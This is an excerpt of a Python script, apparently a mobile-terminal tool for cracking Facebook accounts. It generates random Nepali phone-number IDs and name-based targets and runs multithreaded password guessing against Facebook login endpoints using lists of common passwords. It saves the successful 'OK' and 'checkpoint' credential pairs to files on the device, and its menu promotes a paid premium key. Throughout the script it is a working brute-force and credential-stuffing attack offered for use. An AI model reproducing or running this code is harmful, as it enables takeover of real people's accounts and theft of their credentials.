        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://www.facebook.com/profile.php?id=100025625916949');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/Gauri.dhami.13');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 😋 ')
                        else:
                        ...
                        linex()
                        url_wa = "https://www.facebook.com/Gauri.dhami.13="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi GD Sir, I Need To Buy Your Paid GD PRO Tools Version 2.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python GD.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def np():
                user=[]
                clear()
                print('\033[1;31m Code example: 9818,9828,9848,9845,9817,9745,9765')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 8000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'nepal@123','nepal111','nepal12345','nepal1234','nepal12','nepal786','ramesh123','rahul@abc','balenshawa@123','123456','randikoban','randi@123','ranalod@123','i love you','nepal12','nepal786','tiktok@@@','tik@tok123','chor@123','999999@99','idhacker','ranmati','lado@123','kalolado','@@@@####','anime#1','anime@love','freefirelove','anime@abc','bhaktapur@123','error123','gameerror','terobau','circket@123']
                                Aking.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
...
def gmail():
                ...
                clear()
                print('\033[1;37m example: muhammad, ali, sajjad, faizan,gdking\033[1;31m')
                linex()
                ...
                with tred(max_workers=30) as Aking:
                        ...
                        for user in fo:
                                ...
                                fs = first_name.lower()
                                ls = last_name.lower()
                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12',fs,fs+'10',fs+'01',fs+'444']
                                Aking.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [GD-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                try:
                        ...
                        last = 'Khan','chaudary','kumar@123','love','fuck','@12345'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [GD-OK] %s | %s'%(ids,pas))
                                open('/sdcard/GD-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [GD-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/GD-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [GD-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/GD-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/GD-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [GD-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/GD-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [GD-OK] '+uid+' | '+pas+'\033[1;97m')
